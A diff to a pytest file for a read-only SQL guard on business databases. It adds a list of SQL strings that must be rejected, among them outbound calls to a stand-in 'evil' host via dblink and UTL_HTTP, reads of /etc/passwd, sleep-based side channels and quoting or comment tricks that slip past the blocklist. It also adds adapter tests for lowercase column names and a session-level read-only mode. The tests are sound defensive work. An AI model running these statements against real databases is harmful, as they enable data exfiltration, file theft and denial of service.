@@ -106,6 +106,83 @@ class TestAssertReadOnly:
     def test_accepts_delete_as_column_name(self) -> None:
         pool._assert_read_only('SELECT "DELETE" AS col FROM t')
 
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            # 时序侧信道：拖住连接（DoS / 探测）
+            "SELECT pg_sleep(5)",
+            "SELECT pg_catalog.pg_sleep(5)",
+            "SELECT pg_advisory_lock(42) FROM t",
+            "SELECT pg_advisory_lock_shared(42) FROM t",
+            "SELECT sleep(10)",
+            "SELECT benchmark(1000000, md5('x'))",
+            "SELECT get_lock('x', 10)",
+            # 跨库 / 出网
+            "SELECT dblink('host=evil', 'SELECT 1')",
+            "SELECT dblink_connect('host=evil')",
+            "SELECT UTL_HTTP.REQUEST('http://evil') FROM dual",
+            "SELECT UTL_INADDR.GET_HOST_ADDRESS('evil') FROM dual",
+            "SELECT UTL_TCP.OPEN_CONNECTION('evil', 80) FROM dual",
+            "SELECT DBMS_LDAP.INIT('evil', 389) FROM dual",
+            # 文件 I/O
+            "SELECT load_file('/etc/passwd')",
+            "SELECT UTL_FILE.FOPEN('DIR', 'f', 'r') FROM dual",
+            "SELECT pg_stat_file('/etc/passwd')",
+            # 进程/管道控制
+            "SELECT pg_terminate_backend(123) FROM t",
+            "SELECT DBMS_PIPE.RECEIVE_MESSAGE('x', 10) FROM dual",
+            "SELECT DBMS_LOCK.SLEEP(10) FROM dual",
+            # 绕过形态：引号包裹的名字 / 名字与左括号间夹注释 / 包内小写成员
+            'SELECT "pg_sleep"(5)',
+            "SELECT `sleep`(10)",
+            "SELECT pg_sleep /* 注释 */ (5)",
+            "SELECT UTL_HTTP.REQUEST /*c*/ ('http://evil') FROM dual",
+            "SELECT utl_http.request('http://evil') FROM dual",
+            # 同一绕过手法用于「写/读文件」函数族（_FORBIDDEN_FUNCTIONS）：
+            # 引号标识符可调用真函数 ⇒ 只读护栏会被击穿（复审 HIGH）
+            'SELECT "nextval"(\'s\')',
+            'SELECT "pg_read_file"(\'/etc/passwd\')',
+            "SELECT \"dblink_exec\"('conn', 'select 1')",
+            "SELECT \"lo_import\"('/tmp/x')",
+            "SELECT `nextval`('s')",
+            # 同类侧信道函数/包的漏项（复审补全）
+            "SELECT pg_sleep_for('1 second')",
+            "SELECT pg_sleep_until(now() + interval '1 second')",
+            "SELECT DBMS_LOB.LOADFROMFILE('DIR', 'f') FROM dual",
+            "SELECT MASTER_POS_WAIT('f', 0, 5)",
+            "SELECT lo_put(1, 0, 'x')",
+            "SELECT pg_notify('ch', 'payload')",
+        ],
+    )
+    def test_rejects_side_channel_functions(self, sql: str) -> None:
+        """侧信道黑名单：即便包在只读 SELECT 里也必须拒（M1）。"""
+        with pytest.raises(SqlSafetyError):
+            pool._assert_read_only(sql)
+
+    @pytest.mark.parametrize(
+        "sql",
+        [
+            "SELECT sleep_count FROM t",
+            "SELECT * FROM T_SLEEP",
+            "SELECT benchmark_id, loaded_file FROM t",
+            "SELECT COUNT(*) AS sleep FROM t",
+            "SELECT a.utl_total FROM t a",
+            # 引号包裹的列名/别名：不是调用形态，不得被引号归一后误杀
+            'SELECT 1 AS "sleep" FROM t',
+            'SELECT "sleep_count" FROM t',
+            "SELECT x.sleep FROM t x",
+            # 纯函数名只可能以 `(` 调用，点号形态（表别名/限定列）不得误杀（复审 MEDIUM）
+            "SELECT sleep.col FROM foo sleep",
+            "SELECT dblink.id FROM t dblink",
+            # 与写函数集合同前缀但不等的标识符不得误杀（裸名匹配按整名比对）
+            "SELECT nextval_count FROM t",
+            "SELECT lo_imported_flag FROM t",
+        ],
+    )
+    def test_accepts_identifiers_containing_side_channel_words(self, sql: str) -> None:
+        """黑名单只认「函数调用/包名」，不得把同名的列、别名、表名一并杀掉。"""
+        pool._assert_read_only(sql)
+
 
 class TestBuildUrl:
     def test_postgres_url_encodes_password(self) -> None:
@@ -197,7 +274,9 @@ class TestOracleAdapterExecute:
         # Act
         rows = await adapter.execute_read_only("SELECT NAME, QTY FROM T")
         # Assert
-        assert rows == [{"NAME": "A", "QTY": 1}, {"NAME": "B", "QTY": 2}]
+        # 列名统一小写（Oracle cursor.description 大写 → lower()，与 SQLAlchemy 适配器
+        # 及 5 个 DQ evaluator 的小写键取值对齐，见 business_db_pool.py 注释）
+        assert rows == [{"name": "A", "qty": 1}, {"name": "B", "qty": 2}]
         assert captured["user"] == "u"
         assert captured["dsn"] == "h:1521/svc"
         # 同步 cursor.close() 被调用、异步 conn.close() 被 await
@@ -219,7 +298,12 @@ class TestOracleAdapterExecute:
         adapter = pool._OracleAdapter("h", 1521, "svc", "u", "p")
         sql = "SELECT t.2025采购量 FROM (SELECT SUM(QTY) AS 2025采购量 FROM T) t"
         await adapter.execute_read_only(sql)
-        assert conn.executed == ['SELECT t."2025采购量" FROM (SELECT SUM(QTY) AS "2025采购量" FROM T) t']
+        # 库侧只读兜底（fix-sql-guard-db-side-readonly 批）：第一步先
+        # ALTER SESSION SET READ ONLY（Oracle 12c+ 会话级只读），再原 SQL。
+        assert conn.executed == [
+            "ALTER SESSION SET READ ONLY",
+            'SELECT t."2025采购量" FROM (SELECT SUM(QTY) AS "2025采购量" FROM T) t',
+        ]
 
     async def test_execute_read_only_injects_nulls_last(self, monkeypatch) -> None:
         """集成：裸 ORDER BY ... DESC 在执行前被补 NULLS LAST，消除跨年 top-N 抓 NULL 行。"""
@@ -236,10 +320,12 @@ class TestOracleAdapterExecute:
             "WHERE ROWNUM <= 10"
         )
         await adapter.execute_read_only(sql)
+        # 库侧只读兜底（fix-sql-guard-db-side-readonly 批）：前置 ALTER SESSION SET READ ONLY
         assert conn.executed == [
+            "ALTER SESSION SET READ ONLY",
             "SELECT * FROM (SELECT ITMREF_0, SUM(QTYUOM_0) AS TOTAL_QTY_2025 "
             "FROM ZJTH.PORDERQ GROUP BY ITMREF_0 ORDER BY TOTAL_QTY_2025 DESC NULLS LAST) "
-            "WHERE ROWNUM <= 10"
+            "WHERE ROWNUM <= 10",
         ]
 
     async def test_execute_read_only_no_limit_drains_full_streaming_result(self, monkeypatch) -> None:
@@ -264,8 +350,8 @@ class TestOracleAdapterExecute:
         rows = await adapter.execute_read_only("SELECT K, V FROM T")
         # Assert
         assert len(rows) == 2500
-        assert rows[0] == {"K": "K0", "V": 0}
-        assert rows[-1] == {"K": "K2499", "V": 2499}
+        assert rows[0] == {"k": "K0", "v": 0}  # 列名统一小写（同上）
+        assert rows[-1] == {"k": "K2499", "v": 2499}  # 列名统一小写（同上）
         assert conn.closed is True
 
     async def test_execute_read_only_positive_limit_uses_single_fetchmany(self, monkeypatch) -> None:
@@ -557,8 +643,24 @@ class _FakeConn:
     async def __aexit__(self, *exc: object) -> bool:
         return False
 
+    def begin(self) -> _FakeTx:
+        # 库侧只读兜底（fix-sql-guard-db-side-readonly 批）：execute_read_only 现在
+        # 在 `async with conn.begin():` 内执行原 SQL。_FakeTx 作为最简 context manager
+        # 透传：SET TRANSACTION READ ONLY 与原 SQL 都跑在同一事务内（事务边界无 IO 差异）。
+        return _FakeTx()
+
     async def execute(self, sql: str) -> _FakeResult:
         return self._result
+
+
+class _FakeTx:
+    """`_FakeConn.begin()` 返回的伪 AsyncTransaction：仅作 context manager 透传。"""
+
+    async def __aenter__(self) -> _FakeTx:
+        return self
+
+    async def __aexit__(self, *exc: object) -> bool:
+        return False
 
 
 class _FakeEngine:
